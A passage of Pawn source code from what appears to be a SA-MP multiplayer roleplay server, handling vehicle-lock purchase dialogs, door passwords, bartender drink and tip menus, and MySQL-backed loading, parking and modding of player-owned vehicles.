					    return 1;
				    }
				    format(string, sizeof(string), "   You have Purchased an industrial lock!");
				    SendClientMessage(playerid, COLOR_GRAD4, string);
				    SendClientMessage(playerid, COLOR_YELLOW, "HINT: You can now use /pvlock to lock your car.");
					PlayerInfo[playerid][pCash] -= 5000;
				    PlayerVehicleInfo[playerid][pvid][pvLock] = 2;
				    SetPVarInt(playerid, "lockmenu", 0);
			    }
			}
		}
	}
	else if(dialogid == DIALOG_CDGLOCKBUY)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetGangVehicleCount(PlayerInfo[playerid][pGang]) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 1000)
			        {
                        SendClientMessage(playerid, COLOR_GRAD2, "   Not enough money!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 1);
                    for(new i=0; i<MAX_GANG_VEHICLES; i++)
	                {
					     if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId] != INVALID_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Vehicle %d | Name: %s.",i+1,GetVehicleName(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDGLOCKMENU, DIALOG_STYLE_INPUT, "24-7;"," Select a vehicle you wish to install this on:", "Select", "Cancel");

				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have any cars - where can we install this item?");
					return 1;
				}
			}
			if(listitem == 1)
			{
				if(GetGangVehicleCount(PlayerInfo[playerid][pGang]) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 5000)
           			{
                        SendClientMessage(playerid, COLOR_GRAD2, "   Not enough money!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 2);
				    for(new i=0; i<MAX_GANG_VEHICLES; i++)
	                {
					     if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId] != INVALID_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Vehicle %d| Name: %s.",i+1,GetVehicleName(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDGLOCKMENU, DIALOG_STYLE_INPUT, "24-7;"," Select a vehicle you wish to install this on:", "Select", "Cancel");
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have any cars - where can we install this item?");
					return 1;
				}
			}
		}
	}
	if(dialogid == DIALOG_CDGLOCKMENU)
	{
		if(response)
		{
		if(GetPVarInt(playerid, "lockmenu") == 1)
		{
            new fvid;
            if(IsNumeric(inputtext))
	        {
				fvid = strval(inputtext)-1;
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvId] == INVALID_VEHICLE_ID)
			    {
				    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You don't have a vehicle in this slot.");
				    SetPVarInt(playerid, "lockmenu", 0);
				    return 1;
			    }
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] == 1)
			    {
				    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You already have this item installed on this vehicle.");
				    SetPVarInt(playerid, "lockmenu", 0);
				    return 1;
			    }
			    format(string, sizeof(string), "   You have purchased an alarm lock!");
			    SendClientMessage(playerid, COLOR_GRAD4, string);
			    SendClientMessage(playerid, COLOR_YELLOW, "HINT: You can now use /gvlock to lock your family car.");
			    PlayerInfo[playerid][pCash] -= 1000;
			    FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] = 1;
			    SetPVarInt(playerid, "lockmenu", 0);
		    }
		}
		else if(GetPVarInt(playerid, "lockmenu") == 2)
		{
		    new fvid;
            if(IsNumeric(inputtext))
	        {
                fvid = strval(inputtext)-1;
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvId] == 0)
			    {
				    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You don't have a vehicle in this slot.");
				    SetPVarInt(playerid, "lockmenu", 0);
	                return 1;
			    }
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] == 2)
		  	    {
				    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You already have this item installed on this vehicle.");
				    SetPVarInt(playerid, "lockmenu", 0);
				    return 1;
			    }
			    format(string, sizeof(string), "   You have Purchased an industrial lock!");
			    SendClientMessage(playerid, COLOR_GRAD4, string);
			    SendClientMessage(playerid, COLOR_YELLOW, "HINT: You can now use /gvlock to lock your family car.");
			    PlayerInfo[playerid][pCash] -= 5000;
			    FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] = 2;
			    SetPVarInt(playerid, "lockmenu", 0);
		    }
		}
		}
	}
	else if(dialogid == DOORLOCK)
	{
		if(response == 1)
		{
		    new i = GetPVarInt(playerid, "Door");
		    if(isnull(inputtext))
		    {
		        SendClientMessage(playerid, COLOR_GREY, "You did not enter anything");
		        return 1;
		    }
		    if(strlen(inputtext) > 24)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "The password can't be greater than 24 characters.");
		        return 1;
		    }
		    if(strcmp(inputtext, DDoorsInfo[i][ddPass], true) == 0)
		    {
		        if(DDoorsInfo[i][ddLocked] == 0)
		        {
					DDoorsInfo[i][ddLocked] = 1;
					SendClientMessage(playerid, COLOR_WHITE, "Password accepted, doors locked.");
		        }
		        else
		        {
		            DDoorsInfo[i][ddLocked] = 0;
		            SendClientMessage(playerid, COLOR_WHITE, "Password accepted, doors unlocked.");
		        }
			}
			else
			{
			    SendClientMessage(playerid, COLOR_WHITE, "Password declined.");
			}
		}
		else
		{
		    return 1;
		}
	}
	else if(dialogid == DRINKLISTDIALOG)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0:
			    {
			        SetPVarString(playerid, "DrinkName", "Beer");
			        SetPVarInt(playerid, "DrinkPrice", 60);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_BEER);
			    }
			    case 1:
			    {
			        SetPVarString(playerid, "DrinkName", "Vodka");
			        SetPVarInt(playerid, "DrinkPrice", 100);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_WINE);
			    }
			    case 2:
			    {
			        SetPVarString(playerid, "DrinkName", "Whiskey");
			        SetPVarInt(playerid, "DrinkPrice", 100);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_WINE);
			    }
			    case 3:
			    {
			        SetPVarString(playerid, "DrinkName", "Water");
			        SetPVarInt(playerid, "DrinkPrice", 20);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_SPRUNK);
			    }
			    case 4:
			    {
			        SetPVarString(playerid, "DrinkName", "Soda");
			        SetPVarInt(playerid, "DrinkPrice", 20);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_SPRUNK);
			    }
			}
			if(GetPlayerCash(playerid) >= GetPVarInt(playerid, "DrinkPrice"))
			{
			    new drinkname[32];
				GetPVarString(playerid, "DrinkName", drinkname, sizeof(drinkname));
			    new drinkprice = GetPVarInt(playerid, "DrinkPrice");
				new dspecialaction = GetPVarInt(playerid, "DrinkSpecialAction");
			    format(string, sizeof(string), "You have asked the bartender for a drink of %s for $%d.  Do you want to tip the bartender?", drinkname, drinkprice);
			    ShowPlayerDialogEx(playerid, DRINKDIALOG, DIALOG_STYLE_MSGBOX, "Drink Purchase", string, "Yes", "No");
			    format(string, sizeof(string), "* %s pours %s a %s and hands it to them.", GetPlayerNameEx(DrinkOffer[playerid]), GetPlayerNameEx(playerid), drinkname);
				ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				format(string, sizeof(string), "* You pour %s a %s, they slide you the money. ($%d)", GetPlayerNameEx(playerid), drinkname, drinkprice);
				SendClientMessage(DrinkOffer[playerid], COLOR_LIGHTBLUE, string);
				GivePlayerCash(DrinkOffer[playerid], drinkprice);
				GivePlayerCash(playerid, -drinkprice);
				SetPlayerSpecialAction(playerid, dspecialaction);
				SetPVarInt(playerid, "DrinkCooledDown", 1);

				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(DrinkOffer[playerid], ipex, sizeof(ipex));
				DrinkWarn[playerid][DrinkOffer[playerid]] += drinkprice;
				if(DrinkWarn[playerid][DrinkOffer[playerid]] >= 2500 && (PlayerInfo[DrinkOffer[playerid]][pLevel] <= 3 || PlayerInfo[DrinkOffer[playerid]][pLevel] <= 3))
				{
					format(string, sizeof(string), "%s (IP:%s) has tipped %s (IP:%s) $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(DrinkOffer[playerid]), ipex, DrinkWarn[playerid][DrinkOffer[playerid]]);
					ABroadCast(COLOR_YELLOW, string, 1);
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money for this drink!");
			}
	    }
	    else
	    {
	        DrinkOffer[playerid] = INVALID_PLAYER_ID;
	    }
	}
	else if(dialogid == DRINKDIALOG)
	{
	    if(response)
	    {
			ShowPlayerDialogEx(playerid, TIPDIALOG, DIALOG_STYLE_INPUT, "Tipping the Bartender", "How much would you like to tip the bartender for his service?", "OK", "Cancel");
		}
		else
		{
		    DrinkOffer[playerid] = INVALID_PLAYER_ID;
		}
	}
	else if(dialogid == TIPDIALOG)
	{
	    if(response)
	    {
			if(GetPlayerCash(playerid) >= strval(inputtext))
			{
			    if(strval(inputtext) < 0 || strval(inputtext) > 1000)
			    {
			    	return ShowPlayerDialogEx(playerid, TIPDIALOG, DIALOG_STYLE_INPUT, "Tipping the Bartender", "Must be above $0 and below $1000.\nHow much would you like to tip the bartender for his service?", "OK", "Cancel");
			    }
			    format(string, sizeof(string), "** %s gives %s a tip for his service.", GetPlayerNameEx(playerid), GetPlayerNameEx(DrinkOffer[playerid]));
				ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				format(string, sizeof(string), "* %s has given you a tip of $%d for your service.", GetPlayerNameEx(playerid), strval(inputtext));
				SendClientMessage(DrinkOffer[playerid], COLOR_LIGHTBLUE, string);
				GivePlayerCash(DrinkOffer[playerid], strval(inputtext));
				GivePlayerCash(playerid, -strval(inputtext));

				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(DrinkOffer[playerid], ipex, sizeof(ipex));
				DrinkWarn[playerid][DrinkOffer[playerid]] += strval(inputtext);
				if(DrinkWarn[playerid][DrinkOffer[playerid]] >= 2500 && (PlayerInfo[DrinkOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3))
				{
					format(string, sizeof(string), "%s (IP:%s) has tipped %s (IP:%s) $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(DrinkOffer[playerid]), ipex, DrinkWarn[playerid][DrinkOffer[playerid]]);
					ABroadCast(COLOR_YELLOW, string, 1);
				}

				DrinkOffer[playerid] = INVALID_PLAYER_ID;
			}
		}
		else
		{
		    DrinkOffer[playerid] = INVALID_PLAYER_ID;
		}
	}
	return 1;
}

//------------------------------------------------------------------------------
//PLAYER OWNED VEHICLES SYSTEM
//------------------------------------------------------------------------------

LockPlayerVehicle(ownerid, carid, type)
{
	new v = GetPlayerVehicle(ownerid, carid);
	if(PlayerVehicleInfo[ownerid][v][pvId] == carid && type == 2)
	{
	    LockStatus[carid] = 1;
	    vehicle_lock_doors(carid);
	}
}

UnLockPlayerVehicle(ownerid, carid, type)
{
	new v = GetPlayerVehicle(ownerid, carid);
	if(PlayerVehicleInfo[ownerid][v][pvId] == carid && type == 2)
	{
	    LockStatus[carid] = 0;
		vehicle_unlock_doors(carid);
	}
}

forward DisableVehicleAlarm(vehicleid);
public DisableVehicleAlarm(vehicleid)
{
	new engine,lights,alarm,doors,bonnet,boot,objective;
 	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    SetVehicleParamsEx(vehicleid,engine,lights,VEHICLE_PARAMS_OFF,doors,bonnet,boot,objective);
	return 1;
}

forward ReleasePlayer(playerid);
public ReleasePlayer(playerid)
{
	SetPVarInt(playerid, "IsFrozen", 0);
	TogglePlayerControllable(playerid,1);
}

stock CreatePlayerVehicle(playerid, playervehicleid, modelid, Float: x, Float: y, Float: z, Float: angle, color1, color2, price) {
	if(PlayerVehicleInfo[playerid][playervehicleid][pvId] == INVALID_PLAYER_VEHICLE_ID) {
 		VehicleSpawned[playerid]++;

	    PlayerCars++;

		PlayerVehicleInfo[playerid][playervehicleid][pvModelId] = modelid;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = x;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = y;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = z;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = angle;
		PlayerVehicleInfo[playerid][playervehicleid][pvColor1] = color1;
		PlayerVehicleInfo[playerid][playervehicleid][pvColor2] = color2;
		PlayerVehicleInfo[playerid][playervehicleid][pvPark] = 1;
		PlayerVehicleInfo[playerid][playervehicleid][pvPrice] = price;
		PlayerVehicleInfo[playerid][playervehicleid][pvFuel] = 100.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] = 0;

		for(new m = 0; m < MAX_MODS; m++)
	    	PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] = 0;

		new
			carcreated = CreateVehicle(modelid, x, y, z, angle, color1, color2, -1);

		LockStatus[carcreated] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvId] = carcreated;
		PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] = 1;
		SetVehicleNumberPlate(carcreated, PlayerVehicleInfo[playerid][playervehicleid][pvNumberPlate]);

		new
		    szQuery[300];
		mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO playervehicles (Owner, PosX, PosY, PosZ, PosAngle, ModelID, Color1, Color2, Price, Spawned) VALUES(%d, '%f', '%f', '%f', '%f', %d, %d, %d, %d, 1)", PlayerInfo[playerid][pID], x, y, z, angle, modelid, color1, color2, price);
		mysql_tquery(sqldb,szQuery);
		// PlayerVehicleInfo[playerid][playervehicleid][pvRealID] = mysql_insert_id();
		return carcreated;
	}
	return INVALID_PLAYER_VEHICLE_ID;
}

stock DestroyPlayerVehicle(playerid, playervehicleid) {
	if(PlayerVehicleInfo[playerid][playervehicleid][pvModelId]) {
	    new
	        szQuery[50];

		mysql_format(sqldb,szQuery, sizeof(szQuery), "DELETE FROM playervehicles WHERE ID = %d", PlayerVehicleInfo[playerid][playervehicleid][pvRealID]);
		mysql_tquery(sqldb,szQuery);

	    VehicleSpawned[playerid]--;

	    PlayerCars--;

		DestroyVehicle(PlayerVehicleInfo[playerid][playervehicleid][pvId]);
		VehicleRadioStation[PlayerVehicleInfo[playerid][playervehicleid][pvId]] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvModelId] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob] = -1;
		PlayerVehicleInfo[playerid][playervehicleid][pvColor1] = 126;
		PlayerVehicleInfo[playerid][playervehicleid][pvColor2] = 126;
		PlayerVehicleInfo[playerid][playervehicleid][pvPrice] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvFuel] = 100.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] = 0;
		LockStatus[PlayerVehicleInfo[playerid][playervehicleid][pvId]] = 0;
	    PlayerVehicleInfo[playerid][playervehicleid][pvId] = INVALID_PLAYER_VEHICLE_ID;

	    if(PlayerVehicleInfo[playerid][playervehicleid][pvAllowedPlayerId] != INVALID_PLAYER_ID) {
	        PlayerInfo[PlayerVehicleInfo[playerid][playervehicleid][pvAllowedPlayerId]][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID;
	        PlayerInfo[PlayerVehicleInfo[playerid][playervehicleid][pvAllowedPlayerId]][pVehicleKeysFrom] = INVALID_PLAYER_ID;
	    	PlayerVehicleInfo[playerid][playervehicleid][pvAllowedPlayerId] = INVALID_PLAYER_ID;
		}

		PlayerVehicleInfo[playerid][playervehicleid][pvRealID] = 0;
	}
}

stock LoadPlayerVehicles(playerid) {
	switch(PlayerInfo[playerid][pVip]) {
		case 0: {
			PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
		}
		case 1: {
            PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
		}
		case 2: {
            PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
        }
		case 3: {
            PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 0;
        }
        default: {
        	PlayerVehicleInfo[playerid][0][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][1][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][2][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][3][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][4][pvDisabled] = 0;
            PlayerVehicleInfo[playerid][5][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][6][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][7][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][8][pvDisabled] = 1;
            PlayerVehicleInfo[playerid][9][pvDisabled] = 1;
        }
	}
	for(new v = 0; v < MAX_PLAYERVEHICLES; v++) {
        if(vehicleCountCheck(playerid)) {
			if(PlayerVehicleInfo[playerid][v][pvModelId] != 0 && PlayerVehicleInfo[playerid][v][pvImpounded] == 0 && PlayerVehicleInfo[playerid][v][pvSpawned] == 1) {

				PlayerCars++;
				VehicleSpawned[playerid]++;
				new carcreated = CreateVehicle(PlayerVehicleInfo[playerid][v][pvModelId], PlayerVehicleInfo[playerid][v][pvPosX], PlayerVehicleInfo[playerid][v][pvPosY], PlayerVehicleInfo[playerid][v][pvPosZ], PlayerVehicleInfo[playerid][v][pvPosAngle],PlayerVehicleInfo[playerid][v][pvColor1], PlayerVehicleInfo[playerid][v][pvColor2], -1);
				PlayerVehicleInfo[playerid][v][pvId] = carcreated;
				//VehicleFuel[carcreated] = PlayerVehicleInfo[playerid][v][pvFuel];

				if(PlayerVehicleInfo[playerid][v][pvLocked]) {
					LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][v][pvId], PlayerVehicleInfo[playerid][v][pvLock]);
				}

				if(strlen(PlayerVehicleInfo[playerid][v][pvNumberPlate]) > 0)
					SetVehicleNumberPlate(carcreated, PlayerVehicleInfo[playerid][v][pvNumberPlate]);

				LoadPlayerVehicleMods(playerid, v);
			}
			else if(PlayerVehicleInfo[playerid][v][pvModelId] == 0 && PlayerVehicleInfo[playerid][v][pvImpounded] != 0) {
				PlayerVehicleInfo[playerid][v][pvImpounded] = 0;
			}
			else if(PlayerVehicleInfo[playerid][v][pvModelId] == 0 && PlayerVehicleInfo[playerid][v][pvSpawned] != 0) {
				PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			}
        }
		else PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
    }
    return 1;
}

vehicleCountCheck(playerid) {
	switch(PlayerInfo[playerid][pVip]) {
		case 0, 1: if(VehicleSpawned[playerid] >= 1) return 0;
		case 2: if(VehicleSpawned[playerid] >= 2) return 0;
		case 3: if(VehicleSpawned[playerid] >= 3) return 0;
		case 4, 5: if(VehicleSpawned[playerid] >= 5) return 0;
		default: return 0;
	}
	return 1;
}

stock UnloadPlayerVehicles(playerid)
{
    new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	for(new v = 0; v < MAX_PLAYERVEHICLES; v++)
    {
        if(PlayerVehicleInfo[playerid][v][pvId] != INVALID_PLAYER_VEHICLE_ID && PlayerVehicleInfo[playerid][v][pvImpounded] == 0)
        {
            PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			VehicleSpawned[playerid]--;
            PlayerCars--;
            if(LockStatus[PlayerVehicleInfo[playerid][v][pvId]] != 0) LockStatus[PlayerVehicleInfo[playerid][v][pvId]] = 0;
            UpdatePlayerVehicleMods(playerid, v);
			DestroyVehicle(PlayerVehicleInfo[playerid][v][pvId]);
			VehicleRadioStation[PlayerVehicleInfo[playerid][v][pvId]] = 0;
			PlayerVehicleInfo[playerid][v][pvId] = INVALID_PLAYER_VEHICLE_ID;
			if(PlayerVehicleInfo[playerid][v][pvAllowedPlayerId] != INVALID_PLAYER_ID)
	    	{
	    	    PlayerInfo[PlayerVehicleInfo[playerid][v][pvAllowedPlayerId]][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID;
	    	    PlayerInfo[PlayerVehicleInfo[playerid][v][pvAllowedPlayerId]][pVehicleKeysFrom] = INVALID_PLAYER_ID;
	    		PlayerVehicleInfo[playerid][v][pvAllowedPlayerId] = INVALID_PLAYER_ID;
			}
        }
    }
}

stock UpdatePlayerVehicleParkPosition(playerid, playervehicleid, Float:newx, Float:newy, Float:newz, Float:newangle, Float:health)
{
    new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	if(PlayerVehicleInfo[playerid][playervehicleid][pvId] != INVALID_PLAYER_VEHICLE_ID)
	{
		 new Float:oldx, Float:oldy, Float:oldz;
		 oldx = PlayerVehicleInfo[playerid][playervehicleid][pvPosX];
		 oldy = PlayerVehicleInfo[playerid][playervehicleid][pvPosY];
		 oldz = PlayerVehicleInfo[playerid][playervehicleid][pvPosZ];
		 if(oldx == newx && oldy == newy && oldz == newz) return 0;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = newx;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = newy;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = newz;
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = newangle;
		 //oldfuel = VehicleFuel[PlayerVehicleInfo[playerid][playervehicleid][pvId]];
		 //VehicleFuel[PlayerVehicleInfo[playerid][playervehicleid][pvId]] = 100.0;
		 UpdatePlayerVehicleMods(playerid, playervehicleid);
		 DestroyVehicle(PlayerVehicleInfo[playerid][playervehicleid][pvId]);
		 new carcreated = CreateVehicle(PlayerVehicleInfo[playerid][playervehicleid][pvModelId], PlayerVehicleInfo[playerid][playervehicleid][pvPosX], PlayerVehicleInfo[playerid][playervehicleid][pvPosY], PlayerVehicleInfo[playerid][playervehicleid][pvPosZ],
		 PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle],PlayerVehicleInfo[playerid][playervehicleid][pvColor1], PlayerVehicleInfo[playerid][playervehicleid][pvColor2], -1);
         PlayerVehicleInfo[playerid][playervehicleid][pvId] = carcreated;
         //VehicleFuel[carcreated] = oldfuel;
         SetVehicleNumberPlate(carcreated, PlayerVehicleInfo[playerid][playervehicleid][pvNumberPlate]);
         SetVehicleHealth(carcreated, health);
		 if(PlayerVehicleInfo[playerid][playervehicleid][pvLocked] == 1) LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][playervehicleid][pvId], PlayerVehicleInfo[playerid][playervehicleid][pvLock]);
         LoadPlayerVehicleMods(playerid, playervehicleid);
         return 1;
	}
	return 0;
}

stock UpdatePlayerVehicleMods(playerid, playervehicleid)
{
	if(PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] == 0 || PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] == 1) {
		new playername[MAX_PLAYER_NAME];
		GetPlayerName(playerid, playername, sizeof(playername));
		new carid = PlayerVehicleInfo[playerid][playervehicleid][pvId];
		new exhaust, frontbumper, rearbumper, roof, spoilers, sideskirt1,
			sideskirt2, wheels, hydraulics, nitro, hood, lamps, stereo, ventright, ventleft;
		exhaust = GetVehicleComponentInSlot(carid, CARMODTYPE_EXHAUST);
		frontbumper = GetVehicleComponentInSlot(carid, CARMODTYPE_FRONT_BUMPER);
		rearbumper = GetVehicleComponentInSlot(carid, CARMODTYPE_REAR_BUMPER);
		roof = GetVehicleComponentInSlot(carid, CARMODTYPE_ROOF);
		spoilers = GetVehicleComponentInSlot(carid, CARMODTYPE_SPOILER);
		sideskirt1 = GetVehicleComponentInSlot(carid, CARMODTYPE_SIDESKIRT);
		sideskirt2 = GetVehicleComponentInSlot(carid, CARMODTYPE_SIDESKIRT);
		wheels = GetVehicleComponentInSlot(carid, CARMODTYPE_WHEELS);
		hydraulics = GetVehicleComponentInSlot(carid, CARMODTYPE_HYDRAULICS);
		nitro = GetVehicleComponentInSlot(carid, CARMODTYPE_NITRO);
		hood = GetVehicleComponentInSlot(carid, CARMODTYPE_HOOD);
		lamps = GetVehicleComponentInSlot(carid, CARMODTYPE_LAMPS);
		stereo = GetVehicleComponentInSlot(carid, CARMODTYPE_STEREO);
		ventright = GetVehicleComponentInSlot(carid, CARMODTYPE_VENT_RIGHT);
		ventleft = GetVehicleComponentInSlot(carid, CARMODTYPE_VENT_LEFT);
		if(spoilers >= 1000)    PlayerVehicleInfo[playerid][playervehicleid][pvMods][0] = spoilers;
		if(hood >= 1000)        PlayerVehicleInfo[playerid][playervehicleid][pvMods][1] = hood;
		if(roof >= 1000)        PlayerVehicleInfo[playerid][playervehicleid][pvMods][2] = roof;
		if(sideskirt1 >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][3] = sideskirt1;
		if(lamps >= 1000)       PlayerVehicleInfo[playerid][playervehicleid][pvMods][4] = lamps;
		if(nitro >= 1000)       PlayerVehicleInfo[playerid][playervehicleid][pvMods][5] = nitro;
		if(exhaust >= 1000)     PlayerVehicleInfo[playerid][playervehicleid][pvMods][6] = exhaust;
		if(wheels >= 1000)      PlayerVehicleInfo[playerid][playervehicleid][pvMods][7] = wheels;
		if(stereo >= 1000)      PlayerVehicleInfo[playerid][playervehicleid][pvMods][8] = stereo;
		if(hydraulics >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][9] = hydraulics;
		if(frontbumper >= 1000) PlayerVehicleInfo[playerid][playervehicleid][pvMods][10] = frontbumper;
		if(rearbumper >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][11] = rearbumper;
		if(ventright >= 1000)   PlayerVehicleInfo[playerid][playervehicleid][pvMods][12] = ventright;
		if(ventleft >= 1000)    PlayerVehicleInfo[playerid][playervehicleid][pvMods][13] = ventleft;
		if(sideskirt2 >= 1000)  PlayerVehicleInfo[playerid][playervehicleid][pvMods][14] = sideskirt2;
	}
}

stock LoadPlayerVehicleMods(playerid, playervehicleid)
{
	if(PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] == 0 || PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] == 1) {
		//printf(" Loading player #%d vehicle #%d mods.", playerid, playervehicleid);

		new paintjob = PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob];
		new color1 = PlayerVehicleInfo[playerid][playervehicleid][pvColor1];
		new color2 = PlayerVehicleInfo[playerid][playervehicleid][pvColor2];
		if(PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob] != -1)
		{
